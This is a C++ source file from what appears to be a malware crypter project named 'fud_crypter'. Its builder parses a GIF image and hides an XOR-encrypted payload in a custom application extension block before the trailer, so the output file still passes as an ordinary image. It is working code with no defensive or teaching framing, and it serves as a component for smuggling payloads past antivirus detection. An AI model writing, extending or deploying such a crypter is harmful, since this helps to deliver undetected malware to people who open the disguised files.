#include "fud_crypter/builder/builder.hpp"
#include "fud_crypter/crypto/xor_crypto.hpp"
#include <cstring>
#include <optional>

namespace fud_crypter {

    constexpr char kGifAppId[8] = {'P','D','M','E','T','A','0','1'};
    constexpr char kGifAppAuth[3] = {'B','I','N'};

    struct GifInfo {
        std::string version;
        uint16_t width = 0, height = 0;
        bool has_gct = false;
        size_t first_block = 0;
    };

    static std::optional<GifInfo> parse_gif(const std::vector<uint8_t>& b) {
        if (b.size() < 13 || std::memcmp(b.data(), "GIF", 3) != 0)
            return std::nullopt;
        GifInfo g;
        g.version.assign(b.begin()+3, b.begin()+6);
        g.width  = static_cast<uint16_t>(b[6] | (b[7] << 8));
        g.height = static_cast<uint16_t>(b[8] | (b[9] << 8));
        uint8_t packed = b[10];
        g.has_gct = (packed & 0x80) != 0;
        size_t gct_bytes = g.has_gct ? 3u * (1u << ((packed & 0x07) + 1)) : 0;
        g.first_block = 13 + gct_bytes;
        if (g.first_block > b.size()) return std::nullopt;
        return g;
    }

    static size_t gif_skip_subblocks(const std::vector<uint8_t>& b, size_t pos) {
        while (pos < b.size()) {
            uint8_t len = b[pos++];
            if (len == 0) return pos;
            pos += len;
        }
        return std::string::npos;
    }

    static size_t gif_trailer_pos(const std::vector<uint8_t>& b, const GifInfo& g) {
        size_t pos = g.first_block;
        while (pos < b.size()) {
            uint8_t intro = b[pos];
            if (intro == 0x3B) return pos;
            if (intro == 0x2C) {
                if (pos + 10 > b.size()) return std::string::npos;
                uint8_t packed = b[pos + 9];
                size_t p = pos + 10;
                if (packed & 0x80) p += 3u * (1u << ((packed & 0x07) + 1));
                if (p >= b.size()) return std::string::npos;
                p = gif_skip_subblocks(b, p + 1);
                if (p == std::string::npos) return std::string::npos;
                pos = p;
            } else if (intro == 0x21) {
                if (pos + 2 > b.size()) return std::string::npos;
                size_t p = gif_skip_subblocks(b, pos + 2);
                if (p == std::string::npos) return std::string::npos;
                pos = p;
            } else {
                return std::string::npos;
            }
        }
        return std::string::npos;
    }

    static std::vector<uint8_t> gif_build_app_extension(const std::vector<uint8_t>& payload) {
        std::vector<uint8_t> out = {0x21, 0xFF, 0x0B};
        out.insert(out.end(), kGifAppId, kGifAppId + 8);
        out.insert(out.end(), kGifAppAuth, kGifAppAuth + 3);
        for (size_t i = 0; i < payload.size();) {
            size_t n = std::min<size_t>(255, payload.size() - i);
            out.push_back(static_cast<uint8_t>(n));
            out.insert(out.end(), payload.begin() + i, payload.begin() + i + n);
            i += n;
        }
        out.push_back(0x00);
        return out;
    }

    static std::optional<std::vector<uint8_t>> gif_insert_payload(
        const std::vector<uint8_t>& b, const std::vector<uint8_t>& payload,
        std::string& err) {
        auto g = parse_gif(b);
        if (!g) { err = "not a GIF"; return std::nullopt; }
        size_t tp = gif_trailer_pos(b, *g);
        if (tp == std::string::npos) { err = "no trailer"; return std::nullopt; }
        auto ext = gif_build_app_extension(payload);
        std::vector<uint8_t> out;
        out.reserve(b.size() + ext.size());
        out.insert(out.end(), b.begin(), b.begin() + tp);
        out.insert(out.end(), ext.begin(), ext.end());
        out.insert(out.end(), b.begin() + tp, b.end());
        return out;
        }

        bool Builder::embed_gif(const std::vector<uint8_t>& payload, const std::vector<uint8_t>& key) {
            logger_->info("Embedding into GIF...");

            std::string template_path = "template.gif";
            auto gif_data = read_file(template_path);
            if (gif_data.empty()) {
                logger_->error("Template GIF not found: " + template_path);
                return false;
            }

            std::vector<uint8_t> stored = crypto::xor_cipher(payload, key);

            std::string err;
            auto out = gif_insert_payload(gif_data, stored, err);
            if (!out) {
                logger_->error("GIF embed failed: " + err);
                return false;
            }

            if (!write_file(config_.output_file, *out)) {
                logger_->error("Cannot write output GIF");
                return false;
            }

            logger_->success("GIF embed successful");
            return true;
        }

} // namespace fud_crypter
